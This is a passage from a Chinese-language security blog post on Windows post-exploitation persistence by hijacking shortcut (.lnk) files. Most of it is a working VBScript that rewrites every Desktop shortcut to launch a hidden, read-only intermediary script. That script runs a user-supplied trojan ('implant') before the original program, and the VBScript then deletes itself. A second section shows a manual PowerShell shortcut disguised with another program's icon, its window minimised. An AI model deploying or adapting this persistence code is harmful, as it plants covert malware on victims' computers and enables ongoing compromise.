class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    randomIndex = GetRandomBetween(<span class="number">1</span>, <span class="built_in">Len</span>(charSet) + <span class="number">1</span>)</span><br><span class="line">    randomChar = <span class="built_in">Mid</span>(charSet, randomIndex, <span class="number">1</span>)</span><br><span class="line">    GetRandomAlphanumeric = randomChar</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; GetRandomFileName</span></span><br><span class="line"><span class="comment">&#x27; 生成一个随机的文件名</span></span><br><span class="line"><span class="keyword">Function</span> GetRandomFileName()</span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	result_length = GetRandomBetween(FILENAME_MIN_LENGTH, FILENAME_MAX_LENGTH + <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">to</span> result_length</span><br><span class="line">		result = result &amp; GetRandomAlphanumeric()</span><br><span class="line">	<span class="keyword">next</span></span><br><span class="line">	GetRandomFileName = result</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; IsEndWithBackSlash</span></span><br><span class="line"><span class="comment">&#x27; 判断当前文件夹是否是以标准的分隔符&quot;\&quot;结尾</span></span><br><span class="line"><span class="keyword">Function</span> IsEndWithBackSlash(path)</span><br><span class="line">	<span class="keyword">Dim</span> stringLength</span><br><span class="line">	stringLength = <span class="built_in">Len</span>(path)</span><br><span class="line">	<span class="keyword">if</span> stringLength &lt;= <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line">		IsEndWithBackSlash = <span class="number">0</span></span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">		lastChar = <span class="built_in">Mid</span>(path, stringLength, <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> lastChar = <span class="string">&quot;\&quot;</span> <span class="keyword">Then</span></span><br><span class="line">			IsEndWithBackSlash = <span class="number">1</span></span><br><span class="line">		<span class="keyword">Else</span> </span><br><span class="line">			IsEndWithBackSlash = <span class="number">0</span></span><br><span class="line">		<span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; GetStandardFolderName</span></span><br><span class="line"><span class="comment">&#x27; 获取以标准的分隔符&quot;\&quot;结尾的文件夹名称</span></span><br><span class="line"><span class="keyword">Function</span> GetStandardFolderName(path)</span><br><span class="line">	<span class="keyword">if</span> IsEndWithBackSlash(path) = <span class="number">1</span> <span class="keyword">Then</span>	</span><br><span class="line">		GetStandardFolderName = path</span><br><span class="line">	<span class="keyword">Else</span></span><br><span class="line">		GetStandardFolderName = path &amp; <span class="string">&quot;\&quot;</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">if</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; TraverseFolder</span></span><br><span class="line"><span class="comment">&#x27; 遍历当前文件夹中的文件/子文件夹</span></span><br><span class="line"><span class="keyword">Function</span> TraverseFolder(folder)</span><br><span class="line">    <span class="keyword">Dim</span> subfolder</span><br><span class="line">	<span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">	<span class="comment">&#x27; 遍历当前文件夹中的文件</span></span><br><span class="line">	<span class="keyword">For</span> <span class="keyword">Each</span> file <span class="keyword">In</span> folder.Files</span><br><span class="line">		<span class="keyword">If</span> Err.Number = <span class="number">0</span> <span class="keyword">And</span> file.Size &gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">			access_file = file.Path</span><br><span class="line">			<span class="keyword">If</span> IsFileSuffixExpected(GetFileSuffixByIndex(file, <span class="number">1</span>), lnkSuffix) = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line">				<span class="keyword">call</span> HookLnk(access_file, folder)</span><br><span class="line">			<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">		<span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line">	<span class="keyword">Next</span></span><br><span class="line">		</span><br><span class="line">	<span class="comment">&#x27; 遍历当前文件夹中的子文件夹</span></span><br><span class="line">	<span class="keyword">For</span> <span class="keyword">Each</span> subfolder <span class="keyword">In</span> folder.SubFolders</span><br><span class="line">		TraverseFolder subfolder <span class="comment">&#x27; 递归调用遍历子文件夹</span></span><br><span class="line">	<span class="keyword">Next</span></span><br><span class="line">	</span><br><span class="line">	TraverseFolder = <span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> HookLnk(filename, folder)</span><br><span class="line">	HasBeenHacked = <span class="number">0</span></span><br><span class="line">	tmp_filename = GetRandomFileName()</span><br><span class="line">	newTarget = GetStandardFolderName(folder) &amp; tmp_filename &amp; <span class="string">&quot;.&quot;</span> &amp; hookScriptSuffix</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">set</span> oShellLink = WshShell.CreateShortcut(filename)</span><br><span class="line">	<span class="keyword">If</span> fso.FileExists(oShellLink) <span class="keyword">Then</span></span><br><span class="line">		<span class="comment">&#x27; 判断快捷方式是否已经被劫持</span></span><br><span class="line">		origTarget = oShellLink.TargetPath</span><br><span class="line">		HasBeenHacked = IsFileSuffixExpected(GetFileSuffixByIndex(origTarget, <span class="number">1</span>), hookScriptSuffix)</span><br><span class="line"></span><br><span class="line">		origArgs = oShellLink.Arguments</span><br><span class="line">		<span class="comment">&#x27;origIcon = oShellLink.IconLocation</span></span><br><span class="line">		origIcon = origTarget </span><br><span class="line">		origDir = oShellLink.WorkingDirectory</span><br><span class="line">		</span><br><span class="line">		<span class="comment">&#x27; 创建后门中间文件(满足条件: 后门不存在 且 Link 尚未被劫持)</span></span><br><span class="line">		<span class="keyword">If</span> fso.FileExists(newTarget) <span class="keyword">Then</span></span><br><span class="line">			oShellLink.TargetPath = newTarget</span><br><span class="line">		<span class="keyword">Else</span></span><br><span class="line">			<span class="keyword">If</span> HasBeenHacked = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">				<span class="comment">&#x27; 设置hook脚本不可见</span></span><br><span class="line">				<span class="keyword">Set</span> File = FSO.CreateTextFile(newTarget,<span class="literal">True</span>)</span><br><span class="line">				special_file_split = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">				File.Write <span class="string">&quot;Set oShell = WScript.CreateObject(&quot;</span> &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; <span class="string">&quot;WScript.Shell&quot;</span> &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; <span class="string">&quot;)&quot;</span> &amp; vbCrLf</span><br><span class="line">				File.Write <span class="string">&quot;oShell.Run &quot;</span> &amp; special_file_split &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; implant &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; special_file_split &amp; vbCrLf</span><br><span class="line">				File.Write <span class="string">&quot;oShell.Run &quot;</span> &amp; special_file_split &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; origTarget &amp; <span class="string">&quot; &quot;</span> &amp; origArgs &amp; <span class="built_in">chr</span>(<span class="number">34</span>) &amp; special_file_split &amp; vbCrLf</span><br><span class="line">				File.Close</span><br><span class="line">				</span><br><span class="line">				oShellLink.TargetPath = newTarget</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">Set</span> SetFileObject = FSO.GetFile(newTarget)</span><br><span class="line">				SetFileObject.Attributes = FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_READONLY</span><br><span class="line">				<span class="keyword">Set</span> SetFileObject = <span class="literal">Nothing</span></span><br><span class="line">			<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">		<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	</span><br><span class="line">		<span class="comment">&#x27; 如果文件并没有被Hook，那么重定向快捷方式指向路径</span></span><br><span class="line">		<span class="keyword">If</span> HasBeenHacked = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">			oShellLink.IconLocation = origTarget &amp; <span class="string">&quot;, 0&quot;</span></span><br><span class="line">		<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">		oShellLink.WorkingDirectory = origDir</span><br><span class="line">		oShellLink.WindowStyle = <span class="number">7</span></span><br><span class="line">		oShellLink.Save</span><br><span class="line">		</span><br><span class="line">		HookLnk = <span class="number">1</span></span><br><span class="line">	<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">	HookLnk = <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">scriptPath = WScript.ScriptFullName</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; implant需要修改成自己的木马路径</span></span><br><span class="line">implant = <span class="string">&quot;C:\Users\Administrator\Desktop\test.exe&quot;</span></span><br><span class="line"><span class="comment">&#x27; curUserDesktop 需要修改成需要修改lnk的文件夹</span></span><br><span class="line">curUser = WshShell.ExpandEnvironmentStrings(<span class="string">&quot;%USERPROFILE%&quot;</span>)</span><br><span class="line">curUserDesktop = GetStandardFolderName(curUser &amp; <span class="string">&quot;\Desktop&quot;</span>)</span><br><span class="line"><span class="keyword">call</span> TraverseFolder(fso.GetFolder(curUserDesktop))</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 删除当前脚本</span></span><br><span class="line"><span class="keyword">If</span> fso.FileExists(scriptPath) <span class="keyword">Then</span></span><br><span class="line">	fso.DeleteFile scriptPath, <span class="literal">True</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">set</span> WshShell = <span class="literal">Nothing</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​	效果如下：</p>
+<p>​	在没有被劫持的情况下一切都正常</p>
+<p><img src="/images/image-20240508193227493.png" alt="image-20240508193227493"></p>
+<p>​	lnk指向被劫持后，会生成一个随机的中间文件用于隐藏命令执行</p>
+<p><img src="/images/image-20240509223229949.png" alt="image-20240509223229949"></p>
+<p><img src="/images/image-20240509223333558.png" alt="image-20240509223333558"></p>
+<h3><span id="22-方法二-手动创建lnk后门">2.2 方法二： 手动创建Lnk后门</span></h3><h4><span id="221-寻找伪装文件创建桌面快捷方式">2.2.1 寻找伪装文件，创建桌面快捷方式</span></h4><p>​	首先需要在windows上找一个伪装的参考对象(这里我们尝试将Winhex.exe作为伪装的参考)，右键制作桌面快捷方式</p>
+<p><img src="/images/image-20240402164638217.png" alt="image-20240402164638217"></p>
+<p>​	快捷方式信息中，“目标”对应的exe文件，起始位置对应的目标文件夹，记录其中目标exe路径:</p>
+<blockquote>
+<p>C:\Users\richard\Desktop\Tools\WinHex15.1SR-8\WinHex.exe</p>
+</blockquote>
+<p><img src="/images/1712047689007.png" alt="1712047689007"></p>
+<h4><span id="222-通过powershell调用加载附加程序">2.2.2 通过Powershell调用加载附加程序</span></h4><p>​	这里通过powershell运行该快捷方式，并添加额外的<code>calc.exe</code>启动项</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-c</span> <span class="string">&quot;invoke-item C:\Users\richard\Desktop\Tools\WinHex15.1SR-8\WinHex.exe; invoke-item c:\windows\system32\calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	保存修改后发现快捷方式图标变成了powershell的图标</p>
+<p><img src="/images/image-20240402164950749.png" alt="image-20240402164950749"></p>
+<p>​	打开快捷方式属性，修改图标</p>
+<p><img src="/images/image-20240402165225392.png" alt="image-20240402165225392"></p>
+<h4><span id="223-修改运行方式隐藏运行窗口">2.2.3 修改运行方式隐藏运行窗口</span></h4><p>​	powershell运行过程中会如同cmd一样存在一个后台的运行窗口，我们双击快捷方式时会有一闪而过的窗口，这时候可以调整属性中的运行方式为”最小化”从而隐藏窗口。</p>
+<p><img src="/images/image-20240402165344284.png" alt="image-20240402165344284"></p>
+<p>​	双击运行，成功执行原始文件和附加文件。</p>
+<p><img src="/images/image-20240402165321403.png" alt="image-20240402165321403"></p>
+<h1><span id="参考文献">参考文献</span></h1><p>[1] <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/shell/links">https://learn.microsoft.com/zh-cn/windows/win32/shell/links</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1770724291436944734&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1770724291436944734&amp;wfr=spider&amp;for=pc</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://blog.csdn.net/Giyomwd/article/details/104143426">https://blog.csdn.net/Giyomwd/article/details/104143426</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://blog.iyatt.com/?p=12695">https://blog.iyatt.com/?p=12695</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/G3c-7JATD2VSHMxHc0lY4A">https://mp.weixin.qq.com/s/G3c-7JATD2VSHMxHc0lY4A</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ew_OBGgJax4ab7OwtoyAuA">https://mp.weixin.qq.com/s/ew_OBGgJax4ab7OwtoyAuA</a></p>
+<p>[7] <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-260953.htm">https://bbs.kanxue.com/thread-260953.htm</a></p>
+<p>[8] <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ae350202-3ba9-4790-9e9e-98935f4ee5af">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/ae350202-3ba9-4790-9e9e-98935f4ee5af</a></p>
+<p>[9] <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/c3376b21-0931-45e4-b2fc-a48ac0e60d15">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/c3376b21-0931-45e4-b2fc-a48ac0e60d15</a></p>
+<p>[10] <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8cd21240-1b5d-43e6-adc4-38cf14e30cea">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/8cd21240-1b5d-43e6-adc4-38cf14e30cea</a></p>
+<p>[11] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1sh/p/17595381.html">https://www.cnblogs.com/zw1sh/p/17595381.html</a></p>
+<p>[12] <a target="_blank" rel="noopener" href="http://www.vxjump.net/files/security_research/lnk_inf.txt">http://www.vxjump.net/files/security_research/lnk_inf.txt</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/10/Windows-Post-Infiltration-Permission-Maintenance-lnk/" data-id="clw0dhqs60005nbvdf6zrc39y" data-title="Windows_Post_Infiltration_Permission_Maintenance_lnk" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Permission/" rel="tag">Permission</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Post/" rel="tag">Post</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/03/28/vulnhub-LAMPSecurity-CTF6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">vulnhub-LAMPSecurity-CTF6</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Permission/" rel="tag">Permission</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Post/" rel="tag">Post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Permission/" style="font-size: 10px;">Permission</a> <a href="/tags/Post/" style="font-size: 10px;">Post</a> <a href="/tags/ctf/" style="font-size: 14px;">ctf</a> <a href="/tags/error/" style="font-size: 12px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 12px;">pwn</a> <a href="/tags/python/" style="font-size: 12px;">python</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 18px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/05/10/Windows-Post-Infiltration-Permission-Maintenance-lnk/">Windows_Post_Infiltration_Permission_Maintenance_lnk</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/28/vulnhub-LAMPSecurity-CTF6/">vulnhub-LAMPSecurity-CTF6</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/28/CTF-ctfshow-misc-introduction-2/">CTF-ctfshow-misc-introduction-2</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/28/CTF-ctfshow-misc-introduction-1/">CTF-ctfshow-misc-introduction-1</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/28/web-RCE-phpstudy-JS2RCE/">web-RCE-phpstudy-JS2RCE</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 R0seK1llere<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
